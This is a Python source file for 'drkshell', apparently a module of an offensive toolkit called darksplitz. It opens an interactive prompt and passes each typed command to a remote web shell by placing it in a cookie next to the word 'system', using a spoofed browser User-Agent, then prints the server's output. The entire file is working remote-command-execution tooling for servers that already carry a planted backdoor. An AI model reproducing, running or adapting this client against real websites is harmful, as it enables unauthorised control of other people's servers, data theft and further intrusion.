#!/usr/bin/env python3
from cmd import Cmd
import requests

class MyPrompt(Cmd):
    url = ''

    def emptyline(self):
        pass

    def default(self, argv):
        cookie = {'x': 'system', 'y': argv}
        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/71.0.3578.98 Chrome/71.0.3578.98 Safari/537.36'}
        r = requests.get(self.url, cookies = cookie, headers = header)
        print(r.text.strip())

    def do_back(self, args):
        back()

    def do_exit(self, args):
        back()

def back():
    from darksplitz import app
    app()

def drkshell(url):
    try:
        banner = " ____             _     ____  _          _ _\n"
        banner += "|  _ \  __ _ _ __| | __/ ___|| |__   ___| | |\n"
        banner += "| | | |/ _` | '__| |/ /\___ \| '_ \ / _ \ | |\n"
        banner += "| |_| | (_| | |  |   <  ___) | | | |  __/ | |\n"
        banner += "|____/ \__,_|_|  |_|\_\|____/|_| |_|\___|_|_|\n\n"
        banner += "     Backbox Indonesia @ 2018 - 2019\n"
        prompt = MyPrompt()
        prompt.url = url
        prompt.prompt = '\r[?] drkshell >> '
        prompt.cmdloop(banner)
    except KeyboardInterrupt:
        print("\r[!] Exiting program...")
        raise SystemExit
